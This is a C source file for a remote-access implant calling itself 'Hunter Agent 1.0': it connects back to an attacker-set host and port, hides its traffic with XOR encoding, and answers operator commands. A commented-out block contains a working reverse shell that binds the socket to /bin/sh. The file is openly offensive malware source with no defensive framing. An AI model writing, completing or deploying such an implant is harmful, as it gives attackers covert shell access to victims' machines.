#include "helpers.c"
#include "payload_common.h"
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>

#define MAXBUF 65536

int
main(void)
{
    int connection_established;
    char* ip = LHOST;
    char* key = KEY;
    int keylen = strlen(key);
    int port = PORT;
    int n = 0;
    char buf[MAXBUF];

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    do {
        connection_established =
            connect(sock, (struct sockaddr*)&sa, sizeof(sa));
    } while (connection_established != 0);

    char* xorhello = XOR("Hunter Agent 1.0\n", key, 17, keylen);
    write(sock, xorhello, 17);
    free(xorhello);

    while (connection_established == 0) {
        while ((n = read(sock, buf, MAXBUF)) > 0) {
            char* xorbuf = XOR(buf, key, n, keylen);
            printf("Buffer is: %s\n", xorbuf);
            // TODO: Revamp argument parsing (there's a better way! :)
            if (strncmp(xorbuf, "help\n", 5) == 0) {
                char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
                write(sock, xorhelp, strlen(MSG_HELP));
                free(xorhelp);
            }

            // TODO: Make proper shell agent command
            /*
            else if(strncmp(buf, "shell\n", 6) == 0)
            {

                    int status = 0;
                    pid_t wpid, child_pid;

                    char* const argv[] = {"/bin/sh", NULL};
                    if((child_pid = fork()) == 0)
                    {
                            char shell_msg[50];
                            snprintf(shell_msg, 50, "\nReverse shell session
            started on PID %i\n", getpid()); write(sock, shell_msg,
            strlen(shell_msg));

                            dup2(sock, 0);
                            dup2(sock, 1);
                            dup2(sock, 2);
                            // Create a child process and start shell inside of
            it execve("/bin/sh", argv, NULL); exit(EXIT_SUCCESS);
                    }
                    // Make the parent process wait for child process to
            terminate while ((wpid = wait(&status)) > 0);

                    write(sock, MSG_EXIT_RSHELL, strlen(MSG_EXIT_RSHELL));
            }
*/
            else if (strncmp(buf, "exit\n", 5) == 0) {
                char* xorexit =
                    XOR(MSG_EXIT_CMD, key, strlen(MSG_EXIT_CMD), keylen);
                write(sock, xorexit, strlen(MSG_EXIT_CMD));
                free(xorexit);
                free(xorbuf);
                exit(EXIT_SUCCESS);
            }

            else {
                char* xorinvalid =
                    XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
                write(sock, xorinvalid, strlen(MSG_INVALID));
            }
            free(xorbuf);
        }
    }

    return 0;
}
